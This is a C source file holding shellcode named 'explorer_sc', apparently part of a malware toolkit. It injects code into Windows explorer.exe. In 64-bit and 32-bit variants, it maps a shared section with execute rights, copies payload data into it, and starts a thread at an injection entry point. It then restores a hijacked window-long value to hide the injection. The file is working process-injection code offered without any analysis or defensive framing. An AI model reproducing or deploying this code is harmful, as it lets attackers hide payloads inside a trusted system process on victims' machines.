#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#include "..\..\..\..\shared\types.h"
#include "..\..\..\code\sc_defines.h"

#define SECTION_QUERY                0x0001
#define SECTION_MAP_WRITE            0x0002
#define SECTION_MAP_READ             0x0004
#define SECTION_MAP_EXECUTE          0x0008
#define SECTION_EXTEND_SIZE          0x0010
#define SECTION_MAP_EXECUTE_EXPLICIT 0x0020 // not included in SECTION_ALL_ACCESS

#define FILE_MAP_COPY       SECTION_QUERY
#define FILE_MAP_WRITE      SECTION_MAP_WRITE
#define FILE_MAP_READ       SECTION_MAP_READ
#define FILE_MAP_ALL_ACCESS SECTION_ALL_ACCESS
#define FILE_MAP_EXECUTE    SECTION_MAP_EXECUTE_EXPLICIT    // not included in FILE_MAP_ALL_ACCESS

#ifdef _WIN64

void explorer_sc(pexplorer_shellcode_data64 pData)
{
    HANDLE hMapping;
    PVOID pMapping;

    //__debugbreak();

    if (!pData->lock) {
        pData->lock = TRUE;

        if (hMapping = pData->_OpenFileMapping._f(FILE_MAP_READ|FILE_MAP_WRITE|FILE_MAP_EXECUTE, FALSE, pData->mappingName)) {
            if (pMapping = pData->_MapViewOfFile._f(hMapping, FILE_MAP_READ|FILE_MAP_WRITE|FILE_MAP_EXECUTE, 0, 0, 0)) {
                __movsb(RtlOffsetToPointer(pMapping, pData->piEntry), (uint8_t*)&pData->pi, sizeof(payload_info_t));
                pData->_CreateThread._f(NULL, 0, RtlOffsetToPointer(pMapping, pData->injectEntry), pMapping, 0, NULL);
            }

            pData->_CloseHandle._f(hMapping);
        }
    }

    pData->_SetWindowLongPtr._f((HANDLE)pData->hWnd, 0, pData->oldLongVtable);
}

#else 

void _declspec(naked) explorer_sc(pexplorer_shellcode_data32 pData, HANDLE hMapping, PVOID pMapping)
{
    __asm mov ebp, esp
    //__asm int 3

    if (!pData->lock) {
        pData->lock = TRUE;

        if (hMapping = pData->_OpenFileMapping(FILE_MAP_READ|FILE_MAP_WRITE|FILE_MAP_EXECUTE, FALSE, pData->mappingName)) {
            if (pMapping = pData->_MapViewOfFile(hMapping, FILE_MAP_READ|FILE_MAP_WRITE|FILE_MAP_EXECUTE, 0, 0, 0)) {
                __movsb(RtlOffsetToPointer(pMapping, pData->piEntry), (uint8_t*)&pData->pi, sizeof(payload_info_t));
                pData->_CreateThread(NULL, 0, RtlOffsetToPointer(pMapping, pData->injectEntry), pMapping, 0, NULL);
            }

            pData->_CloseHandle(hMapping);
        }
    }

    pData->_SetWindowLong(pData->hWnd, 0, pData->oldLongVtable);

    __asm {
        xor eax, eax
        add esp, 0x54
        pop ebp
        retn 0x10
    }
}

#endif // _WIN64
